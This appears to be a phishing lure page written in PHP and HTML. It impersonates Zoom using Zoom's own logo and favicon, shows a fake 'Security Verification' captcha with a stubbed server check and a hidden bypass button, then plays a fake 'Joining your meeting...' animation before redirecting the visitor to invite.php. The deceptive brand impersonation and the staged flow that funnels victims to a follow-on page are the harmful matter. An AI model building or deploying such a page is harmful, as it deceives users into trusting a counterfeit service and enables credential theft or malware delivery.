<?php
// 🛡️ Turnstile Verification
$isVerified = false;
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Local testing: always succeed
    $isVerified = true;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zoom Meeting</title>
    <link rel="icon" type="image/png" href="https://st1.zoom.us/zoom.ico">
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .container {
            text-align: center;
            padding: 40px;
            max-width: 400px;
            width: 90%;
        }

        .logo {
            width: 120px;
            margin-bottom: 30px;
        }

        /* Captcha Styles */
        h2 { font-size: 20px; color: #2d2d2d; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; margin-bottom: 30px; }

        /* Connecting Styles */
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0E72ED;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .joining-text {
            font-size: 18px;
            font-weight: 500;
            color: #0E72ED;
        }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://st1.zoom.us/static/6.3.52789/image/new/topNav/Zoom_logo.svg" alt="Zoom" class="logo">

        <?php if (!$isVerified): ?>
            <!-- Captcha State -->
            <form id="captchaForm" method="POST">
                <h2>Security Verification</h2>
                <p>Please verify you are a human to join the secure meeting.</p>
                <div class="cf-turnstile" data-sitekey="0x4AAAAAADQjZDgz9ScgrZwr" data-callback="onSubmit"></div>
                
                <!-- Bypass for testing -->
                <button type="submit" style="margin-top: 20px; opacity: 0; cursor: default;">Bypass</button>
            </form>
            <script>
                function onSubmit(token) {
                    document.getElementById("captchaForm").submit();
                }
            </script>
        <?php else: ?>
            <!-- Connecting State -->
            <div class="spinner"></div>
            <div class="joining-text">Joining your meeting...</div>
            <p style="margin-top: 10px;">Connecting to secure meeting servers...</p>

            <script>
                // After 3 seconds of connecting, redirect to invite.php
                setTimeout(() => {
                    window.location.href = 'invite.php';
                }, 3000);
            </script>
        <?php endif; ?>
    </div>

</body>
</html>
